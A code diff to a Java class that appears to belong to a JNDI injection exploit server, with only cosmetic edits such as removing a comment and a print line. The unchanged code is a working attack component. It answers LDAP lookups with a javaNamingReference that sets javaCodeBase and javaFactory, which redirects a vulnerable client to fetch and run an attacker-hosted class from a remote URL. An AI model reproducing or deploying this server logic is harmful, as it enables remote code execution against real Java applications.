@@ -20,9 +20,6 @@ import java.util.Base64;
 
 import static org.fusesource.jansi.Ansi.ansi;
 
-/**
- * 本地工厂类加载
- */
 @LdapMapping(uri = {"/basic"})
 public class BasicController implements LdapController {
     private static String     payloadType;
@@ -61,12 +58,12 @@ public class BasicController implements LdapController {
             }
 
             String className1 = className.replaceAll("\\.", "/");
+
             URL    turl       = new URL(new URL(this.codebase), className1 + ".class");
             System.out.println(ansi().render("@|green [+] Send LDAP reference result for |@" + base + " @|green redirecting to |@" + turl));
-            System.out.println("-------------------------------------- JNDI Remote Refenrence Links --------------------------------------");
             e.addAttribute("javaClassName", "foo");
             e.addAttribute("javaCodeBase", this.codebase);
-            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+            e.addAttribute("objectClass", "javaNamingReference");
             e.addAttribute("javaFactory", className);
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
